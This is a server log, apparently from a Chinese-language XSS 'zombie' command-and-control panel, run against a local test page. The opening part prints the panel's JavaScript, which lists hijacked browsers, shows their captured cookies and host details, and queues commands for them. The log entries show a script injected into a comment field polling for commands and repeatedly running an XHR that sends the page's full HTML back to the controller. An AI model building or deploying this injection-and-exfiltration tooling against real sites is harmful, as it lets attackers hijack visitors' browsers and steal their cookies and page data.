 \n    &lt;h2&gt;\n        &lt;form action=&#34;/&#34; method=&#34;post&#34;&gt;\n            &lt;input type=&#34;text&#34; name=&#34;comment&#34; placeholder=&#34;Enter your comment&#34;&gt;\n            &lt;button type=&#34;submit&#34;&gt;Submit&lt;/button&gt;\n        &lt;/form&gt;\n    &lt;/h2&gt;\n\n\n&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;</p>\n            <p><strong>建立時間:</strong> 2025-06-26 22:41:31.137856</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                                <button class="action-btn result-btn" onclick="event.stopPropagation(); showZombieResults(\'${zombie}\')">\n                                    📋 查看結果\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n\n    // 新增：顯示殭屍機器的執行結果\n    async function showZombieResults(zombieIp) {\n        try {\n            const response = await fetch(`/api/control/get_zombie_details/${zombieIp}`);\n            const data = await response.json();\n\n            if (data.status === \'success\') {\n                // 創建彈出視窗顯示結果\n                const modal = createResultModal(data);\n                document.body.appendChild(modal);\n                modal.style.display = \'block\';\n            } else {\n                alert(`無法獲取結果: ${data.error}`);\n            }\n        } catch (error) {\n            console.error(\'獲取結果失敗:\', error);\n            alert(\'獲取結果時發生網路錯誤\');\n        }\n    }\n\n    // 創建結果顯示彈出視窗\n    function createResultModal(zombieData) {\n        const modal = document.createElement(\'div\');\n        modal.className = \'result-modal\';\n        modal.innerHTML = `\n            <div class="modal-content">\n                <div class="modal-header">\n                    <h3>🧟 殭屍機器詳細信息: ${zombieData.zombie_ip}</h3>\n                    <button class="close-modal" onclick="closeModal(this)">&times;</button>\n                </div>\n                <div class="modal-body">\n                    <!-- 註冊信息 -->\n                    <div class="info-section">\n                        <h4>📝 註冊信息</h4>\n                        <div class="info-content">\n                            ${formatRegistrationInfo(zombieData.registration_info)}\n                        </div>\n                    </div>\n\n                    <!-- 當前命令 -->\n                    <div class="info-section">\n                        <h4>⚡ 當前待執行命令</h4>\n                        <div class="info-content">\n                            <code>${zombieData.current_command || \'無待執行命令\'}</code>\n                        </div>\n                    </div>\n\n                    <!-- 執行結果 -->\n                    <div class="info-section">\n                        <h4>📊 命令執行結果</h4>\n                        <div class="results-container">\n                            ${formatExecutionResults(zombieData.execution_results)}\n                        </div>\n                    </div>\n\n                    <!-- 時間信息 -->\n                    <div class="info-section">\n                        <h4>🕒 時間信息</h4>\n                        <div class="info-content">\n                            <p><strong>註冊時間:</strong> ${formatDateTime(zombieData.created_at)}</p>\n                            <p><strong>最後活動:</strong> ${formatDateTime(zombieData.last_seen)}</p>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        `;\n        return modal;\n    }\n\n    // 格式化註冊信息\n    function formatRegistrationInfo(regInfo) {\n        if (!regInfo || Object.keys(regInfo).length === 0) {\n            return \'<p>無註冊信息</p>\';\n        }\n\n        let html = \'<div class="reg-info">\';\n        for (const [key, value] of Object.entries(regInfo)) {\n            const displayKey = {\n                \'where\': \'來源頁面\',\n                \'hostname\': \'主機名稱\',\n                \'cookie\': \'Cookie\',\n                \'user_agent\': \'用戶代理\',\n                \'time_stamp\': \'時間戳記\'\n            }[key] || key;\n\n            html += `<p><strong>${displayKey}:</strong> ${value}</p>`;\n        }\n        html += \'</div>\';\n        return html;\n    }\n\n    // 格式化執行結果\n    function formatExecutionResults(results) {\n        if (!results || results.length === 0) {\n            return \'<div class="no-results">尚無執行結果</div>\';\n        }\n\n        let html = \'\';\n        results.forEach((result, index) => {\n            const statusIcon = result.success ? \'✅\' : \'❌\';\n            const statusText = result.success ? \'成功\' : \'失敗\';\n\n            html += `\n                <div class="result-item ${result.success ? \'success\' : \'error\'}">\n                    <div class="result-header">\n                        <span class="result-status">${statusIcon} ${statusText}</span>\n                        <span class="result-time">${formatDateTime(result.timestamp)}</span>\n                    </div>\n                    <div class="result-command">\n                        <strong>命令:</strong> <code>${result.command || \'未知命令\'}</code>\n                    </div>\n                    ${result.output ? `\n                        <div class="result-output">\n                            <strong>輸出:</strong>\n                            <pre>${result.output}</pre>\n                        </div>\n                    ` : \'\'}\n                    ${result.error ? `\n                        <div class="result-error">\n                            <strong>錯誤:</strong>\n                            <pre>${result.error}</pre>\n                        </div>\n                    ` : \'\'}\n                </div>\n            `;\n        });\n\n        return html;\n    }\n\n    // 格式化日期時間\n    function formatDateTime(dateStr) {\n        if (!dateStr) return \'未知\';\n        try {\n            return new Date(dateStr).toLocaleString(\'zh-TW\');\n        } catch {\n            return dateStr;\n        }\n    }\n\n    // 關閉彈出視窗\n    function closeModal(button) {\n        const modal = button.closest(\'.result-modal\');\n        if (modal) {\n            modal.remove();\n        }\n    }\n</script>\n\n<!-- 添加彈出視窗的CSS樣式 -->\n<style>\n    .result-modal {\n        position: fixed;\n        top: 0;\n        left: 0;\n        width: 100%;\n        height: 100%;\n        background-color: rgba(0, 0, 0, 0.5);\n        z-index: 1000;\n        display: none;\n    }\n\n    .modal-content {\n        position: relative;\n        background-color: white;\n        margin: 2% auto;\n        padding: 0;\n        width: 90%;\n        max-width: 800px;\n        max-height: 90vh;\n        overflow-y: auto;\n        border-radius: 8px;\n        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);\n    }\n\n    .modal-header {\n        background-color: #343a40;\n        color: white;\n        padding: 15px 20px;\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        border-radius: 8px 8px 0 0;\n    }\n\n    .modal-header h3 {\n        margin: 0;\n        font-size: 1.2em;\n    }\n\n    .close-modal {\n        background: none;\n        border: none;\n        color: white;\n        font-size: 24px;\n        cursor: pointer;\n        padding: 0;\n        width: 30px;\n        height: 30px;\n        display: flex;\n        align-items: center;\n        justify-content: center;\n    }\n\n    .close-modal:hover {\n        background-color: rgba(255, 255, 255, 0.2);\n        border-radius: 50%;\n    }\n\n    .modal-body {\n        padding: 20px;\n    }\n\n    .info-section {\n        margin-bottom: 25px;\n        border: 1px solid #e9ecef;\n        border-radius: 6px;\n        overflow: hidden;\n    }\n\n    .info-section h4 {\n        background-color: #f8f9fa;\n        margin: 0;\n        padding: 12px 15px;\n        border-bottom: 1px solid #e9ecef;\n        font-size: 1em;\n    }\n\n    .info-content {\n        padding: 15px;\n    }\n\n    .reg-info p {\n        margin: 8px 0;\n        word-break: break-all;\n    }\n\n    .results-container {\n        max-height: 400px;\n        overflow-y: auto;\n    }\n\n    .result-item {\n        border: 1px solid #dee2e6;\n        border-radius: 4px;\n        margin-bottom: 10px;\n        padding: 12px;\n    }\n\n    .result-item.success {\n        border-left: 4px solid #28a745;\n        background-color: #f8fff9;\n    }\n\n    .result-item.error {\n        border-left: 4px solid #dc3545;\n        background-color: #fff8f8;\n    }\n\n    .result-header {\n        display: flex;\n        justify-content: space-between;\n        align-items: center;\n        margin-bottom: 8px;\n    }\n\n    .result-status {\n        font-weight: bold;\n    }\n\n    .result-time {\n        color: #6c757d;\n        font-size: 0.9em;\n    }\n\n    .result-command,\n    .result-output,\n    .result-error {\n        margin: 8px 0;\n    }\n\n    .result-command code {\n        background-color: #f8f9fa;\n        padding: 2px 4px;\n        border-radius: 3px;\n        font-family: \'Courier New\', monospace;\n    }\n\n    .result-output pre,\n    .result-error pre {\n        background-color: #f8f9fa;\n        border: 1px solid #e9ecef;\n        border-radius: 4px;\n        padding: 10px;\n        margin: 5px 0;\n        white-space: pre-wrap;\n        word-wrap: break-word;\n        font-family: \'Courier New\', monospace;\n        font-size: 0.9em;\n        max-height: 200px;\n        overflow-y: auto;\n    }\n\n    .result-error pre {\n        background-color: #fff5f5;\n        border-color: #fed7d7;\n        color: #c53030;\n    }\n\n    .no-results {\n        text-align: center;\n        color: #6c757d;\n        font-style: italic;\n        padding: 20px;\n    }\n\n    .result-btn {\n        background-color: #17a2b8 !important;\n    }\n\n    .result-btn:hover {\n        background-color: #138496 !important;\n    }\n\n    .zombie-actions {\n        display: flex;\n        gap: 8px;\n    }\n\n    .action-btn {\n        flex: 1;\n        padding: 6px 12px;\n        font-size: 0.85em;\n    }\n</style>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-26 22:41:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:33] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-26 22:41:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:33] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-26 22:41:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:33] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 22:41:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-26 22:41:34 | INFO     | control_route.py:187 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-26 22:41:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-26 22:41:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:34] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-26 22:41:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:41:36 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:41:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:41:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:41:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:41:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:41:36 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:41:36 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:41:36.129Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:41:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0079s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:41:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:36] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:41:36 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:41:36 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:41:36.143129
2025-06-26 22:41:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0072s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
2025-06-26 22:41:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:36] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:41:37 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombie_details(zombie_ip='127.0.0.1')
2025-06-26 22:41:37 | INFO     | control_route.py:285 | get_zombie_details() | 用戶請求查看殭屍機器 127.0.0.1 的詳細信息
2025-06-26 22:41:37 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombie_details 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 1541 bytes [200 OK]>
2025-06-26 22:41:37 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:37] "GET /api/control/get_zombie_details/127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:41:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:41:41 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:41:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:41:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:41:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:41:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:41:41 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:41:41 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:41:41.129Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:41:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0119s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:41:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:41] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:41:41 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:41:41 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:41:41.154472
2025-06-26 22:41:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0218s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
2025-06-26 22:41:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:41] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:41:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:41:46 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:41:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:41:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:41:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:41:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:41:46 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:41:46 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:41:46.129Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:41:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0039s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:41:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:46] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:41:46 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:41:46 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:41:46.139002
2025-06-26 22:41:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0069s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
2025-06-26 22:41:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:46] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:41:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:41:51 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:41:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:41:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:41:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:41:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:41:51 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:41:51 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:41:51.128Z","success":true,"output":"命令執行成功，無返回值","error":null}
2025-06-26 22:41:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] send_result 執行完畢 (耗時: 0.0058s) -> 回傳: <Response 79 bytes [200 OK]>
2025-06-26 22:41:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:51] "POST /api/control/send_result HTTP/1.1" 200 -
2025-06-26 22:41:51 | INFO     | control_route.py:43 | add_message() | 更新現有記錄，目標IP: 127.0.0.1
2025-06-26 22:41:51 | INFO     | control_route.py:54 | add_message() | 消息添加成功，目標IP: 127.0.0.1,消息: 完整頁面HTML: <html><head>
    <meta charset="UTF-8">
    <title> My website</title>
</head>

<body>
    <h1>Hello World</h1>
    \
    <div class="comment">
        <script src="http://127.0.0.1:8964/api/control/xss_payload"></script>
    <div>
    
    <h2>
        <form action="/" method="post">
            <input type="text" name="comment" placeholder="Enter your comment">
            <button type="submit">Submit</button>
        </form>
    </h2>


</div></div></body></html>,時間: 2025-06-26 22:41:51.141947
2025-06-26 22:41:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0116s) -> 回傳: (<Response 736 bytes [200 OK]>, 200)
2025-06-26 22:41:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:51] "GET /api/control/add_message?message=完整頁面HTML:%20<html><head>%0A%20%20%20%20<meta%20charset%3D"UTF-8">%0A%20%20%20%20<title>%20My%20website</title>%0A</head>%0A%0A<body>%0A%20%20%20%20<h1>Hello%20World</h1>%0A%20%20%20%20\\%0A%20%20%20%20<div%20class%3D"comment">%0A%20%20%20%20%20%20%20%20<script%20src%3D"http://127.0.0.1:8964/api/control/xss_payload"></script>%0A%20%20%20%20<div>%0A%20%20%20%20%0A%20%20%20%20<h2>%0A%20%20%20%20%20%20%20%20<form%20action%3D"/"%20method%3D"post">%0A%20%20%20%20%20%20%20%20%20%20%20%20<input%20type%3D"text"%20name%3D"comment"%20placeholder%3D"Enter%20your%20comment">%0A%20%20%20%20%20%20%20%20%20%20%20%20<button%20type%3D"submit">Submit</button>%0A%20%20%20%20%20%20%20%20</form>%0A%20%20%20%20</h2>%0A%0A%0A</div></div></body></html>&target_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:41:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:41:56 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:41:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 289 bytes [200 OK]>
2025-06-26 22:41:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:41:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:41:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 send_result()
2025-06-26 22:41:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-26 22:41:56 | INFO     | control_route.py:23 | add_message() | 用戶使用GET方法上傳消息 (可能通過XSS)
2025-06-26 22:41:56 | INFO     | control_route.py:269 | send_result() | 成功為殭屍機器 127.0.0.1 發送結果: {"command":"var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://127.0.0.1:8964/api/control/add_message?message=' + encodeURIComponent('完整頁面HTML: ' + document.documentElement.outerHTML.substring(0, 1000)) + '&target_ip=' + window.location.hostname); xhr.send();","timestamp":"2025-06-26T14:41:56.128Z","success":true,"output":"命令執行成功，無返回值","error":null}
